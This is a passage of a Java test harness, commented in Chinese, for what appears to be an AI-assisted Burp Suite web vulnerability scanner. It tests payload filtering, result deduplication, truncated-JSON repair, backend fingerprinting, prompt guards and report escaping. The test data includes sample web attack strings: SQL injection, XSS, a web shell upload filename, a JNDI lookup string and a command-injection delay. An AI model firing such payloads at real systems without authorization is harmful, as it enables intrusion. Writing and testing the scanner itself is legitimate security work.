        // 而请求体里就写着 filename="a.png"，于是键就是 filename —— 上传该用的两种载荷形态
        //（自带 filename="shell.php"、整段 part）都天然含 filename= / name=，会被上面那条
        // name=value 规则整条误杀，文件上传一条不剩。
        int keptAttr = payloadsOf(norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"FILE_UPLOAD\",\"payload\":" + gson.toJson("filename=\"shell.php\"")
                        + ",\"position\":\"filename\",\"wafBypass\":false}]}",
                params, multipartRequest, new java.util.LinkedHashSet<>(List.of("filename"))));
        check("position 是 filename 属性时，filename=\"shell.php\" 载荷仍保留", keptAttr == 1,
                "被丢弃了，保留 " + keptAttr + " 条");

        int keptAttrWhole = payloadsOf(norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"FILE_UPLOAD\",\"payload\":" + gson.toJson(wholePart)
                        + ",\"position\":\"filename\",\"wafBypass\":false}]}",
                params, multipartRequest, new java.util.LinkedHashSet<>(List.of("filename"))));
        check("position 是 filename 属性时，整段 part 载荷仍保留", keptAttrWhole == 1,
                "被丢弃了，保留 " + keptAttrWhole + " 条");

        // 豁免必须限定在 multipart 场景：普通参数位置上，「带参数名的回显」照旧要丢
        //（否则改这条规则等于给所有类型开了一个旁路）。
        Object formBypass = norm.invoke(engine,
                "{\"testPayloads\":[{\"type\":\"SQL注入\",\"payload\":"
                        + gson.toJson("Content-Disposition: form-data; name=\"id\"\r\n\r\nid=1' OR '1'='1")
                        + ",\"position\":\"id\",\"wafBypass\":false}]}",
                List.of("id"), null, new java.util.LinkedHashSet<>(List.of("id")));
        int formBypassKept = formBypass == null ? -1 : payloadsOf(formBypass);
        check("非 multipart 请求里整段 part 形态不豁免（豁免没有变成旁路）", formBypassKept == 0,
                "保留了 " + formBypassKept + " 条");

        // 同一条宽容原则也用在 step3：模型把载荷数组写成单个对象时，不该让整份回复作废
        Object singleObj = norm.invoke(engine,
                "{\"testPayloads\":{\"type\":\"SQL注入\",\"payload\":\"1\",\"position\":\"id\",\"wafBypass\":false}}",
                List.of("id"), null, new java.util.LinkedHashSet<>(List.of("id")));
        check("testPayloads 写成单个对象时按一条载荷处理（不再整份作废）",
                singleObj != null && payloadsOf(singleObj) == 1,
                singleObj == null ? "整份回复被丢（走成分析失败）" : "保留了 " + payloadsOf(singleObj) + " 条");
    }

    /**
     * 一个组合 9 条载荷常常好几条都被确认。逐条计入会让「漏洞数」虚高
     * （用户看到「一个参数上发现 4 个 SQL 注入」），所以要按（参数位置, 类型）合并。
     */
    static void checkVulnDedup() {
        com.zackai.model.ScanTask task = new com.zackai.model.ScanTask(
                1, null, "GET", "http://x/", com.zackai.model.ScanTask.ScanMode.CUSTOM);
        task.addOrMergeVulnerability(vuln("id", "SQL注入", 96, com.zackai.model.ScanTask.VulnLevel.HIGH));
        check("同一参数同一类型：只记 1 条（此前 9 条载荷各记一次）", task.getVulnerabilities().size() == 1,
                "记了 " + task.getVulnerabilities().size() + " 条");
        task.addOrMergeVulnerability(vuln("id", "SQL注入", 98, com.zackai.model.ScanTask.VulnLevel.CRITICAL));
        check("同一组合后来有更强的证据 → 替换成高的那条", task.getVulnerabilities().size() == 1
                && task.getVulnerabilities().get(0).getConfidence() == 98, "未替换");
        task.addOrMergeVulnerability(vuln("id", "SQL注入", 95, com.zackai.model.ScanTask.VulnLevel.LOW));
        check("同一组合证据更弱 → 不覆盖（保留 98 那条）", task.getVulnerabilities().size() == 1
                && task.getVulnerabilities().get(0).getConfidence() == 98, "被弱证据覆盖了");
        task.addOrMergeVulnerability(vuln("id", "XSS跨站脚本", 96, com.zackai.model.ScanTask.VulnLevel.HIGH));
        check("同参数不同类型 → 分别记（是两条漏洞）", task.getVulnerabilities().size() == 2,
                "记了 " + task.getVulnerabilities().size() + " 条");
        task.addOrMergeVulnerability(vuln("name", "SQL注入", 97, com.zackai.model.ScanTask.VulnLevel.HIGH));
        check("不同参数同一类型 → 分别记", task.getVulnerabilities().size() == 3,
                "记了 " + task.getVulnerabilities().size() + " 条");
        task.addOrMergeVulnerability(vuln("Header:Cookie", "SQL注入", 97, com.zackai.model.ScanTask.VulnLevel.HIGH));
        task.addOrMergeVulnerability(vuln("cookie", "SQL注入", 99, com.zackai.model.ScanTask.VulnLevel.HIGH));
        check("header:X 与裸 X 视为同一个位置（不重复记）", task.getVulnerabilities().size() == 4,
                "记了 " + task.getVulnerabilities().size() + " 条");
        check("等级 = 剩余记录里的最高值", task.getVulnLevel() == com.zackai.model.ScanTask.VulnLevel.CRITICAL,
                String.valueOf(task.getVulnLevel()));

        // 替换掉那条高等级记录后，等级必须跟着降下来（不能停留在 i==0 时算出的旧值）
        com.zackai.model.ScanTask t2 = new com.zackai.model.ScanTask(
                2, null, "GET", "http://x/", com.zackai.model.ScanTask.ScanMode.CUSTOM);
        t2.addOrMergeVulnerability(vuln("a", "命令注入", 95, com.zackai.model.ScanTask.VulnLevel.CRITICAL));
        check("只有一条 CRITICAL 时等级是 CRITICAL",
                t2.getVulnLevel() == com.zackai.model.ScanTask.VulnLevel.CRITICAL, String.valueOf(t2.getVulnLevel()));
        t2.addOrMergeVulnerability(vuln("a", "命令注入", 99, com.zackai.model.ScanTask.VulnLevel.MEDIUM));
        check("更强的证据替换掉 CRITICAL 那条后，等级重算为 MEDIUM（不留旧值）",
                t2.getVulnLevel() == com.zackai.model.ScanTask.VulnLevel.MEDIUM, String.valueOf(t2.getVulnLevel()));
    }

    static com.zackai.model.VulnResult vuln(String position, String name, int confidence,
                                           com.zackai.model.ScanTask.VulnLevel level) {
        com.zackai.model.VulnResult v = new com.zackai.model.VulnResult(name, name, level);
        v.setPosition(position);
        v.setConfidence(confidence);
        return v;
    }

    /** 步骤2 的窗口：请求体与响应体都给 STEP2_INFO_WINDOW（此前都只给 2000 字符） */
    static void checkStep2Window() throws Exception {
        java.lang.reflect.Field f = AIEngine.class.getDeclaredField("STEP2_INFO_WINDOW");
        f.setAccessible(true);
        int window = (Integer) f.get(null);
        check("步骤2 的窗口是 10000 字符", window == 10000, "实际 " + window);

        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method m = AIEngine.class.getDeclaredMethod("buildRequestInfo",
                burp.IHttpRequestResponse.class, boolean.class);
        m.setAccessible(true);
        // 请求体与响应体都在第 6000 字符附近埋一条特征
        String reqBody = "{\"a\":\"" + "p".repeat(6000) + "\",\"marker\":\"REQ_DEEP_MARKER\"}";
        String respBody = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
                + "<html><head><title>t</title></head><body>" + "x".repeat(6000)
                + "<div>SQL syntax error near '1'</div></body></html>";
        String request = "POST /a HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
                + "Content-Length: " + reqBody.length() + "\r\n\r\n" + reqBody;
        burp.IHttpRequestResponse stub = (burp.IHttpRequestResponse) java.lang.reflect.Proxy.newProxyInstance(
                OASTHarness.class.getClassLoader(), new Class[]{burp.IHttpRequestResponse.class},
                (p, method, args) -> {
                    if ("getRequest".equals(method.getName())) {
                        return request.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    }
                    if ("getResponse".equals(method.getName())) {
                        return respBody.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    }
                    throw new UnsupportedOperationException(method.getName());
                });
        String info = (String) m.invoke(engine, stub, true);
        check("响应第 6000 字符处的报错进入了步骤2 的输入（2000 窗口时看不到）",
                info.contains("SQL syntax error near"), "被截断了");
        check("请求体第 6000 字符处的字段也进入了步骤2 的输入（请求体窗口已与响应体一致）",
                info.contains("REQ_DEEP_MARKER"), "请求体被截断了");
        check("两处窗口都标注了字符数",
                info.contains("请求体（前 10000 字符）") && info.contains("响应体（前 10000 字符）"), "标注不对");
    }

    /**
     * 与 AI 的交互契约：
     * ① step2/step3 的返回被 max_tokens 截断时要能补全（此前只有验证阶段会补，截断=整个任务不发包）；
     * ② 「响应一致 + 耗时无差 + 无回连记录」的载荷不该再花一次 AI 调用（结论已确定）。
     */
    static void checkAiInteraction() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method parse = AIEngine.class.getDeclaredMethod("parseAiJson", String.class);
        parse.setAccessible(true);

        String truncated = "{\"testPayloads\":[{\"type\":\"SQL_INJECTION\",\"payload\":\"1'\",\"position\":\"id\","
                + "\"wafBypass\":false},{\"type\":\"XSS\",\"payload\":\"<script>alert(1)</script>\",\"position\":\"q\","
                + "\"wafBypass\":false},{\"type\":\"XSS\",\"payload\":\"<img src=x onerror=alert(1)>\"";
        com.google.gson.JsonObject repaired = (com.google.gson.JsonObject) parse.invoke(engine, truncated);
        check("step3 被截断的 JSON 能补全（保住已写完整的载荷）", repaired != null
                && repaired.getAsJsonArray("testPayloads").size() == 2,
                repaired == null ? "补全失败（整个任务会判为分析失败）" : "补出了 "
                        + repaired.getAsJsonArray("testPayloads").size() + " 条");

        String step2Trunc = "{\"analysis\":\"参数 id 像是数字型\",\"paramVulnMap\":[{\"param\":\"id\","
                + "\"vulnTypes\":[\"SQL注入\"],\"reason\":\"数字型参数\"},{\"param\":\"q\",\"vulnTypes\":[\"XSS跨站脚本\"";
        com.google.gson.JsonObject step2Fixed = (com.google.gson.JsonObject) parse.invoke(engine, step2Trunc);
        check("step2 被截断的 JSON 也能补全（此前只有验证阶段会补）", step2Fixed != null,
                "补全失败");
        check("语法完好的 JSON 照常解析", ((com.google.gson.JsonObject) parse.invoke(engine, "{\"a\":1}")) != null, "解析失败");

        java.lang.reflect.Method nod = AIEngine.class.getDeclaredMethod("noObservableDifference",
                byte[].class, long.class, byte[].class, long.class, boolean.class, byte[].class);
        nod.setAccessible(true);
        java.nio.charset.Charset utf8 = java.nio.charset.StandardCharsets.UTF_8;
        byte[] same = "HTTP/1.1 200 OK\r\n\r\nok".getBytes(utf8);
        byte[] diff = "HTTP/1.1 200 OK\r\n\r\nother".getBytes(utf8);
        check("响应一致 + 耗时无差 + 无回连记录 → 跳过 AI 验证",
                (Boolean) nod.invoke(null, same, 200L, same, 260L, false, null), "没跳过");
        check("响应有差异 → 交给 AI", !(Boolean) nod.invoke(null, same, 200L, diff, 260L, false, null), "被跳过了");
        check("耗时差超容差（时间盲注）→ 交给 AI", !(Boolean) nod.invoke(null, same, 200L, same, 6500L, false, null), "被跳过了");
        check("有回连记录 → 交给 AI", !(Boolean) nod.invoke(null, same, 200L, same, 260L, true, null), "被跳过了");
        check("基线耗时未知 → 交给 AI（不猜）", !(Boolean) nod.invoke(null, same, -1L, same, 260L, false, null), "被跳过了");
        check("缺基线响应 → 交给 AI", !(Boolean) nod.invoke(null, null, 200L, same, 260L, false, null), "被跳过了");

        // —— 易变响应头（Date）不参与「有没有差异」的判断 ——
        // 不剥的话，只要目标发 Date 头（几乎人人都发，粒度 1 秒，而步骤1 到步骤4 隔着两次模型往返），
        // 两个响应就永远「不相等」，这条跳过规则等于死代码（摘要里 `无差异跳过验证 K` 恒为 0）
        byte[] dateA = "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:01 GMT\r\n\r\nok".getBytes(utf8);
        byte[] dateB = "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:59 GMT\r\n\r\nok".getBytes(utf8);
        check("只有 Date 头不同 → 仍算无差异（否则跳过规则在真实目标上形同虚设）",
                (Boolean) nod.invoke(null, dateA, 200L, dateB, 260L, false, null), "被当成有差异了");
        byte[] dateBodyDiff = "HTTP/1.1 200 OK\r\nDate: Tue, 27 Sep 2026 12:00:01 GMT\r\n\r\nother".getBytes(utf8);
        check("正文里的差异照样认（剥头没有把正文也剥了）",
                !(Boolean) nod.invoke(null, dateA, 200L, dateBodyDiff, 260L, false, null), "正文差异被当成无差异了");

        // —— 同组合对照：与基线一致、却与对照不同 → 必须交给 AI ——
        // 布尔盲注的恒真载荷（响应与基线一致）与恒假载荷（响应与基线不同）分开判是谁也读不出来的，
        // 它的证据形态正是「和对照不一样」
        check("与基线一致、与同组合对照也一致 → 跳过（与旧行为相同）",
                (Boolean) nod.invoke(null, same, 200L, same, 260L, false, same), "没跳过");
        check("与基线一致、但与同组合对照不同 → 交给 AI（成对证据不能被跳过吃掉）",
                !(Boolean) nod.invoke(null, same, 200L, same, 260L, false, diff), "被跳过了");
        check("对照为 null（组合第一条 / 没记到）→ 退回旧行为",
                (Boolean) nod.invoke(null, same, 200L, same, 260L, false, null), "行为变了");

        // —— 掩码本身：长度必须逐字节不变（evidenceAnchor 的偏移与 excerptForPrompt 的切片都靠它） ——
        java.lang.reflect.Method mask = AIEngine.class.getDeclaredMethod("volatileHeadersMasked", byte[].class);
        mask.setAccessible(true);
        byte[] masked = (byte[]) mask.invoke(null, (Object) dateA);
        check("掩码后长度不变（否则窗口整体错位）", masked.length == dateA.length,
                dateA.length + " → " + masked.length);
        check("掩码只动响应头的值，正文一字不改",
                new String(masked, utf8).endsWith("\r\n\r\nok"), new String(masked, utf8).replace("\r\n", "\\r\\n"));
    }

    /**
     * Markdown 报告：代码块围栏必须比内容里最长的一串反引号更长。
     * 固定写 ``` 时，被扫目标只要在响应体里回一行 ``` 就能闭合围栏，
     * 后面跟的内容会被当成报告正文渲染（伪造漏洞条目、钓鱼链接都做得到）。
     */
    static void checkMarkdownReport() throws Exception {
        com.zackai.model.ScanTask task = new com.zackai.model.ScanTask(1, null, "GET", "http://t/");
        task.setStatus(com.zackai.model.ScanTask.TaskStatus.FINISHED);
        com.zackai.model.VulnResult vuln = new com.zackai.model.VulnResult(
                "SQL注入", "SQL注入", com.zackai.model.ScanTask.VulnLevel.HIGH);
        vuln.setPayload("1' AND 1=1-- -");
        vuln.setDescription("回显了 SQL 报错");
        vuln.setResponseData("HTTP/1.1 200 OK\r\n\r\n```\n# 伪造的标题\n<img src=x onerror=alert(1)>\n```");
        task.addOrMergeVulnerability(vuln);

        java.io.File out = java.io.File.createTempFile("zack-md-", ".md");
        out.deleteOnExit();
        com.zackai.util.ReportGenerator.generateMarkdownReport(task, out.getAbsolutePath());
        String md = new String(java.nio.file.Files.readAllBytes(out.toPath()), java.nio.charset.StandardCharsets.UTF_8);

        check("响应体里的 ``` 不再能闭合代码块（围栏自动加长）",
                md.contains("````"), md.contains("```\n# 伪造") ? "仍是 3 个反引号" : "没找到加长围栏");
        // 按 CommonMark 的规则走一遍报告：整行反引号是围栏，开 N 个反引号时只有 ≥N 的整行才能闭合。
        // 被扫目标回显的那行 ``` 必须仍然落在围栏内部，且所有围栏成对闭合。
        int openFence = 0;
        int forgedInsideFence = -1;
        for (String line : md.split("\n", -1)) {
            String t = line.trim();
            java.util.regex.Matcher fm = java.util.regex.Pattern.compile("^(`{3,})([^`]*)$").matcher(t);
            if (fm.matches()) {
                int n = fm.group(1).length();
                if (openFence == 0) {
                    openFence = n;
                } else if (n >= openFence) {
                    openFence = 0;
                }
                continue;
            }
            if (t.contains("# 伪造的标题")) {
                forgedInsideFence = openFence;
            }
        }
        check("被扫目标回显的伪标题仍落在围栏内部（那行 ``` 不再能提前闭合代码块）",
                forgedInsideFence > 0, "出现时的围栏状态=" + forgedInsideFence);
        check("报告里的代码围栏全部成对闭合", openFence == 0, "结束时仍有未闭合的围栏");
        check("响应原文仍然完整保留在报告里", md.contains("onerror=alert(1)"), "内容丢了");
    }

    /**
     * 报告里的「测试参数」必须等于**真正发出过载荷的位置**（AIEngine 载荷循环里写入），
     * 不是 Burp 报上来的候选参数列表 —— 以前它在 step2（AI 还没分析）就被写成了
     * `String.join(", ", validParamNames)`，于是日志里在打 `username [SQL注入]`、
     * 报告里却列着 username, password, csrf…，读报告的人会以为每个参数都发过包。
     *
     * <p>这里钉住报告侧的契约：字段里是什么就渲染什么（原样、经转义），空就是空 ——
     * 不许再退回「候选参数列表」那类看起来很丰满的兜底。
     */
    /**
     * 后端语言指纹。文件上传类的载荷是**分语言**的（.php 配 <?php、.jsp 配 <%、.aspx 配 <%@ Page），
     * 而指南里最显眼的例子是 PHP 的，模型整轮只出 .php 是常见结果 —— 所以这里替它把语言推出来。
     *
     * <p>这个函数的价值全在**不猜**：把 nginx/Apache 读成 PHP 会让整轮载荷打错语言，
     * 比返回空串（提示词会转成「各语言都试」）更糟。下面专门钉了这条。
     */
    static void checkBackendStack() throws Exception {
        java.lang.reflect.Method detect = AIEngine.class.getDeclaredMethod("detectBackendStack", byte[].class);
        detect.setAccessible(true);
        String[][] cases = {
            {"HTTP/1.1 200 OK\r\nServer: nginx/1.24.0\r\nContent-Type: text/html\r\n\r\n<html>hi</html>", ""},
            {"HTTP/1.1 200 OK\r\nServer: Apache/2.4.58 (Debian)\r\n\r\nok", ""},
            {"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.2.7\r\n\r\nok", "PHP"},
            {"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=abc; path=/\r\n\r\nok", "PHP"},
            {"HTTP/1.1 200 OK\r\nSet-Cookie: JSESSIONID=node0abc.node0; Path=/\r\n\r\nok", "Java（Tomcat/JSP）"},
            {"HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\n\r\nok", "Java（Tomcat/JSP）"},
            {"HTTP/1.1 500 \r\n\r\nWhitelabel Error Page ... /error", "Java（Tomcat/JSP）"},
            {"HTTP/1.1 200 OK\r\nSet-Cookie: ASP.NET_SessionId=xyz; path=/\r\n\r\nok", ".NET（IIS/ASPX）"},
            {"HTTP/1.1 200 OK\r\nServer: Microsoft-IIS/10.0\r\nX-AspNet-Version: 4.0.30319\r\n\r\nok", ".NET（IIS/ASPX）"},
        };
        for (String[] c : cases) {
            String got = (String) detect.invoke(null, (Object) c[0].getBytes(java.nio.charset.StandardCharsets.UTF_8));
            String shown = c[0].replace("\r\n", "|");
            check("指纹「" + shown.substring(0, Math.min(58, shown.length())) + "」→ "
                            + (c[1].isEmpty() ? "不猜（空）" : c[1]),
                    c[1].equals(got), "得到「" + got + "」");
        }
        check("响应为空/为 null 时不抛异常也不猜",
                "".equals(detect.invoke(null, (Object) null))
                        && "".equals(detect.invoke(null, (Object) new byte[0])), "出错了");

        // 算出来还得真的进到提示词里 —— 指纹只写在注释里等于没做
        java.lang.reflect.Method prompt = AIEngine.class.getDeclaredMethod("buildStep3UserPrompt",
                com.zackai.model.ScanTask.class, String.class, com.google.gson.JsonObject.class, List.class);
        prompt.setAccessible(true);
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        com.google.gson.JsonObject step2 = new com.google.gson.JsonObject();
        step2.add("paramVulnMap", new com.google.gson.JsonArray());

        com.zackai.model.ScanTask javaTask = new com.zackai.model.ScanTask(1, null, "POST", "http://t/u");
        javaTask.setOriginalResponseBytes(
                "HTTP/1.1 200 OK\r\nSet-Cookie: JSESSIONID=abc; Path=/\r\n\r\nok"
                        .getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String javaPrompt = (String) prompt.invoke(engine, javaTask, "请求信息", step2, new java.util.ArrayList<String>());
        check("step3 提示词里带上了识别出的后端语言", javaPrompt.contains("目标指纹") && javaPrompt.contains("Java"),
                javaPrompt.length() > 200 ? javaPrompt.substring(0, 200) : javaPrompt);

        com.zackai.model.ScanTask unknownTask = new com.zackai.model.ScanTask(2, null, "POST", "http://t/u");
        unknownTask.setOriginalResponseBytes(
                "HTTP/1.1 200 OK\r\nServer: nginx\r\n\r\nok".getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String unknownPrompt = (String) prompt.invoke(engine, unknownTask, "请求信息", step2, new java.util.ArrayList<String>());
        check("认不出后端时提示词明确要求多语言各出几条（而不是默认 PHP）",
                unknownPrompt.contains("未能从响应里识别") && unknownPrompt.contains("各出几条"),
                unknownPrompt.length() > 240 ? unknownPrompt.substring(0, 240) : unknownPrompt);
    }

    /**
     * 提示词层两条「改错了不报错、只静默失效」的守卫：
     *
     * <p>① 授权声明必须在三个阶段、两种扫描模式的 system prompt 里都在（它只在开头一句，
     * 被谁重构掉不会有任何编译期或运行期信号）。验证提示词那条还要过一遍
     * {@code trimVerifyFeatures} —— 声明写在 VERIFY_FEATURE_HEADER 之前，裁剪时必须留在 head 里。
     *
     * <p>② 注入点提示必须按扫描模式裁剪。文件上传档收到「写 BODY」的暗示时，
     * {@code replaceWholeBody} 会把整个 multipart 请求体换成一行 {@code filename="shell.php"} ——
     * 载荷确实在字节里、注入层自检也过，但目标根本解析不出文件。
     */
    static void checkPromptGuards() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        Class<?> modeCls = Class.forName("com.zackai.model.ScanTask$ScanMode");
        Class<?> taskCls = com.zackai.model.ScanTask.class;

        java.lang.reflect.Constructor<?> ctor = null;
        for (java.lang.reflect.Constructor<?> c : taskCls.getConstructors()) {
            if (c.getParameterCount() == 5) ctor = c;
        }
        if (ctor == null) {
            check("找得到带扫描模式的 ScanTask 构造器", false, "没有 5 参数构造器");
            return;
        }
        ctor.setAccessible(true);

        Object fileUpload = ctor.newInstance(1, null, "POST", "http://t/u",
                Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), "FILE_UPLOAD"));
        Object custom = ctor.newInstance(2, null, "POST", "http://t/u",
                Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), "CUSTOM"));
        Object shiro = ctor.newInstance(3, null, "POST", "http://t/u",
                Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), "SHIRO"));

        java.lang.reflect.Method step2 = AIEngine.class.getDeclaredMethod("buildStep2SystemPrompt", taskCls);
        step2.setAccessible(true);
        java.lang.reflect.Method step3 = AIEngine.class.getDeclaredMethod(
                "buildStep3SystemPrompt", taskCls, java.util.Set.class);
        step3.setAccessible(true);
        java.lang.reflect.Method verifyPrompt = AIEngine.class.getDeclaredMethod("getDefaultVerifyPrompt");
        verifyPrompt.setAccessible(true);
        java.lang.reflect.Method trim = AIEngine.class.getDeclaredMethod(
                "trimVerifyFeatures", String.class, java.util.Set.class);
        trim.setAccessible(true);
        java.lang.reflect.Method hints = AIEngine.class.getDeclaredMethod("step2InjectionHints", modeCls);
        hints.setAccessible(true);

        // ① 授权声明：两种模式 × 三个阶段
        for (Object[] pair : new Object[][]{{fileUpload, "单类型"}, {custom, "CUSTOM"}}) {
            String p2 = (String) step2.invoke(engine, pair[0]);
            String p3 = (String) step3.invoke(engine, pair[0], new java.util.HashSet<String>());
            check(pair[1] + " step2 系统提示带授权声明",
                    p2.contains("测试性质") && p2.contains("已获授权"), p2.length() > 120 ? p2.substring(0, 120) : p2);
            check(pair[1] + " step3 系统提示带授权声明",
                    p3.contains("测试性质") && p3.contains("已获授权"), p3.length() > 120 ? p3.substring(0, 120) : p3);
        }
        String vp = (String) verifyPrompt.invoke(engine);
        check("验证提示词带授权声明", vp.contains("测试性质") && vp.contains("已获授权"), "");
        java.util.Set<String> one = new java.util.HashSet<String>();
        one.add("SQL注入");
        String trimmed = (String) trim.invoke(engine, vp, one);
        check("裁剪验证特征块之后授权声明仍在（它必须落在 head 里）",
                trimmed.contains("测试性质") && trimmed.length() < vp.length(), "裁剪后长度 " + trimmed.length());

        // ② 注入点提示按模式裁剪
        // 断言按「推荐的形态」判定，不能拿 BODY/timeout 这种词做否定判断 ——
        // 提示词里出现它们的地方恰恰是禁止它们的那一句（文件上传那条自己也带「不要用 BODY」）。
        final String BODY_TIP = "整个请求体也是注入点";
        String hintUpload = (String) hints.invoke(null, fileUpload.getClass().getMethod("getScanMode").invoke(fileUpload));
        check("文件上传扫描不再收到「写 BODY」的注入点暗示（整段替换会毁掉 multipart）",
                !hintUpload.contains(BODY_TIP) && !hintUpload.contains("rememberMe")
                        && !hintUpload.contains("User-Agent") && hintUpload.contains("multipart"), hintUpload);
        String hintShiro = (String) hints.invoke(null, shiro.getClass().getMethod("getScanMode").invoke(shiro));
        check("Shiro 扫描收到 Cookie 注入点但不收到 BODY",
                hintShiro.contains("rememberMe") && !hintShiro.contains(BODY_TIP), hintShiro);
        String hintCustom = (String) hints.invoke(null, custom.getClass().getMethod("getScanMode").invoke(custom));
        check("CUSTOM 扫描仍然拿到全部五条注入点提示",
                hintCustom.contains("User-Agent") && hintCustom.contains("rememberMe")
                        && hintCustom.contains(BODY_TIP) && hintCustom.contains("URL_PATH")
                        && hintCustom.contains("multipart"), hintCustom);

        // ③ 两条技术错误不许回来
        java.lang.reflect.Method cmdGuide = AIEngine.class.getDeclaredMethod(
                "getPayloadGuideForVulnType", modeCls);
        cmdGuide.setAccessible(true);
        Object cmdMode = Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), "COMMAND_INJECTION");
        String cmd = (String) cmdGuide.invoke(engine, cmdMode);
        check("命令注入指南不再把 timeout /t 当作 Windows 的延时载荷（非交互 cmd 里它立刻退出）",
                cmd.contains("ping -n 6 127.0.0.1 >nul") && !cmd.contains("、& timeout /t 6（Windows）"), "");
        Object xssMode = Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), "XSS");
        String xss = (String) cmdGuide.invoke(engine, xssMode);
        check("XSS 指南不再一刀切排除存储型（同一条响应里渲染出来的可以测）",
                xss.contains("同一条响应里就渲染出来") && !xss.contains("存储型与纯 DOM 型拿不到证据"), "");

        // ④ 指南示例必须是纯值：载荷过滤器会丢掉含「本条载荷自己的参数名=」的载荷（防模型回显整个
        // 参数），而模型照抄示例是常态 —— 示例里带 id= 前缀时，参数名恰好叫 id 的那次扫描会把整个
        // WAF 绕过维度静默丢光。这里按「示例里不许出现 id=」钉住（id 是最常见的参数名）。
        java.lang.reflect.Method wafGuide = AIEngine.class.getDeclaredMethod(
                "getWafBypassGuideForVulnType", modeCls);
        wafGuide.setAccessible(true);
        Object sqlMode = Enum.valueOf((Class<Enum>) modeCls.asSubclass(Enum.class), "SQL_INJECTION");
        String sqliWaf = (String) wafGuide.invoke(engine, sqlMode);
        check("SQL 注入 WAF 指南的示例不带参数名前缀（带了就会被载荷过滤器整条丢掉）",
                !sqliWaf.contains("id=") && sqliWaf.contains("1/**/OR/**/1=1"), sqliWaf.substring(0, Math.min(60, sqliWaf.length())));
    }

    /**
     * 英文模式下的报告：切到英文导出的 HTML/Markdown 应该是英文的。
     *
     * <p>报告侧原来只有中文模式的断言（{@code checkTestParamsInReport}），
     * 翻完之后在英文下等于没测 —— 而且报告是**交付物**，混着中文的表头会直接给客户看到。
     * 类型名、等级名走渲染映射（数据层仍是中文），修复建议来自 {@code Msg} 的 fix.* 表。
     */
    /**
     * 占位符替换必须**单趟**，而且要能容纳载荷里的花括号与美元符。
     *
     * <p>这曾经是个静默 bug：按序号循环 replace 时，参数值里本来就有的 {@code {N}}
     * 会被后面那一轮再替换一次 —— SSTI 载荷 {@code {{1}}} 在日志行里会变成 {@code {XSS}}。
     * 载荷里带花括号太常见了，所以这条钉住。
     */
    static void checkMsgPlaceholderSafety() throws Exception {
        java.lang.reflect.Method t = com.zackai.i18n.Msg.class
                .getDeclaredMethod("t", String.class, Object[].class);
        t.setAccessible(true);
        String out = (String) t.invoke(null, "log.step4.payload",
                new Object[]{"1", "9", "XSS", "q", "{{1}}", " (OOB prefix a1)"});
        check("载荷里的 {{1}} 不会被后续占位符轮次改写（曾把 {{1}} 改成 {XSS}）",
                out.contains("{{1}}") && !out.contains("{XSS}"), out);
        String dollar = (String) t.invoke(null, "log.step4.payload",
                new Object[]{"1", "9", "XSS", "q", "${jndi:dns://x/1}", ""});
        check("载荷里的 $ 不会被当成正则组引用（$1 会被吞掉）",
                dollar.contains("${jndi:dns://x/1}"), dollar);
        String short1 = (String) t.invoke(null, "log.counters", new Object[]{"3"});
        check("参数个数少于占位符时，未替换的 {n} 原样保留（漏传参数在界面上看得见）",
                short1.contains("{3}"), short1);
    }

    static void checkEnglishReport() throws Exception {
        com.zackai.model.ScanTask t = new com.zackai.model.ScanTask(9, null, "POST", "http://t/r");
        t.setStatus(com.zackai.model.ScanTask.TaskStatus.FINISHED);
        t.setTestParams("username");
        com.zackai.model.VulnResult v = new com.zackai.model.VulnResult(
                "SQL注入", "SQL注入", com.zackai.model.ScanTask.VulnLevel.HIGH);
        v.setPayload("1'");
        v.setPosition("username");
        v.setConfidence(99);
        t.addOrMergeVulnerability(v);

        java.io.File mdFile = java.io.File.createTempFile("zack-en-", ".md");
        java.io.File htmlFile = java.io.File.createTempFile("zack-en-", ".html");
        mdFile.deleteOnExit();
        htmlFile.deleteOnExit();
        com.zackai.i18n.Msg.setLang("en");
        try {
            com.zackai.util.ReportGenerator.generateMarkdownReport(t, mdFile.getAbsolutePath());
            com.zackai.util.ReportGenerator.generateReport(t, htmlFile.getAbsolutePath());
        } finally {
            com.zackai.i18n.Msg.setLang("zh");
        }
        String md = new String(java.nio.file.Files.readAllBytes(mdFile.toPath()),
                java.nio.charset.StandardCharsets.UTF_8);
        String html = new String(java.nio.file.Files.readAllBytes(htmlFile.toPath()),
                java.nio.charset.StandardCharsets.UTF_8);

        check("英文模式下 Markdown 报告标题是英文",
                md.contains("# Zack-AI-Scanner Vulnerability Report"), md.split("\n")[0]);
        check("英文模式下漏洞类型翻成英文（不带出中文类型名）",
                md.contains("- Type: SQL Injection") && !md.contains("SQL注入"),
                md.contains("- Type: SQL Injection") ? "类型行是英文了" : "类型行还是中文");
        check("英文模式下等级名翻成英文", md.contains("- Severity: High"), "");
        check("英文模式下的修复建议来自英文表",
                md.contains("Use parameterised queries") && !md.contains("使用参数化查询"), "");
        check("英文模式下 HTML 报告的表头是英文",
                html.contains("<h2>Task</h2>") && html.contains("Tested parameters"), "");
        check("英文模式下 HTML 报告不再声明 zh-CN",
                html.contains("lang=\"en\"") && !html.contains("lang=\"zh-CN\""), "");
        check("HTML 报告的 <title> 开闭标签成对（少了开标签，标题会被浏览器渲染成正文里多出来的一行字）",
